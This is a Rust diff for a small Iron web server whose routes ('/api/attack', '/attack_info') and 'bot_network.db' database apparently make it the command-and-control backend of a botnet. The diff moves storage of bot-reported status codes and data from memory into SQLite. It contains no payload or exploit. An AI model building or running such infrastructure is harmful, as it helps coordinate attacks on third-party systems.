@@ -11,23 +11,15 @@ use rusqlite::{Connection, Result};
 use serde_json;
 use std::vec;
 
-struct ServerData {
-    attack_address: String,
-    ret_data: Vec<String>,
-}
-
-impl ServerData {
-    fn new(addr: String, ret: Vec<String>) -> ServerData {
-        ServerData {
-            attack_address: addr,
-            ret_data: ret,
-        }
-    }
-}
-
 fn main() {
     let mut router = Router::new();
-    let server = ServerData::new(String::from("14"), vec![]);
+    let conn = Connection::open("bot_network.db").unwrap();
+    conn.execute(
+        "CREATE TABLE IF NOT EXISTS request_info (
+             id INTEGER PRIMARY KEY AUTOINCREMENT,
+             status_code TEXT,
+             received_data TEXT
+         )",[]).unwrap();
     router.get(
         "/api/attack",
         move |_: &mut Request| Ok(Response::with((status::Ok, "true"))),
@@ -36,41 +28,39 @@ fn main() {
     router.get(
         "/attack_info",
         move |_: &mut Request| {
-            let attack_info = serde_json::json!({
-                "attack_address": &server.attack_address,
-                "requests_completed_amount": server.ret_data.len(),
-            });
-            Ok(Response::with((status::Ok, attack_info.to_string())))
+            let mut vec: Vec<String> = vec![];
+            let conn = Connection::open("bot_network.db").unwrap();
+            let q = "SELECT * FROM request_info";
+            let mut stmt = conn.prepare(q).unwrap();
+            let iter = stmt.query_map([], |row|{
+                Ok(serde_json::json!({
+                    "id": row.get::<usize, i64>(0).unwrap().to_string(),
+                    "status_code": row.get::<usize, String>(1).unwrap().to_string(),
+                    "received_data": row.get::<usize, String>(2).unwrap().to_string()
+                }))}).unwrap();
+            for elem in iter {
+                vec.push(elem.unwrap().to_string());
+            }
+            Ok(Response::with((status::Ok, vec.join("\n"))))
         },
         "attack_info",
     );
 
     router.post(
-        "attack_info",
+        "/attack_info",
         move |req: &mut Request| {
-            let body = req.get::<bodyparser::Json>().unwrap();
-            let _received = match body {
-                None => serde_json::json!({"error": "No body"}).to_string(),
-                Some(body) => serde_json::json!(body).to_string(),
-            };
-
+            let res = req.get::<bodyparser::Json>().unwrap().unwrap();
+            // let received = serde_json::from_str::<serde_json::Value>(res.as_str()).unwrap().to_string();
             let conn = Connection::open("bot_network.db").unwrap();
             conn.execute(
                 "CREATE TABLE IF NOT EXISTS request_info (
              id INTEGER PRIMARY KEY,
              status_code TEXT,
              received_data TEXT
-         )",
-                [],
-            )
-            .unwrap();
-
+         )", [], ).unwrap();
             conn.execute(
                 "INSERT INTO request_info (status_code, received_data) VALUES (?1, ?2)",
-                &[&status::Ok.to_string(), &_received],
-            )
-            .unwrap();
-
+                [res["code"].to_string(), res["body"].to_string()]).unwrap();
             Ok(Response::with((status::Ok, "ok")))
         },
         "set_attack_info",
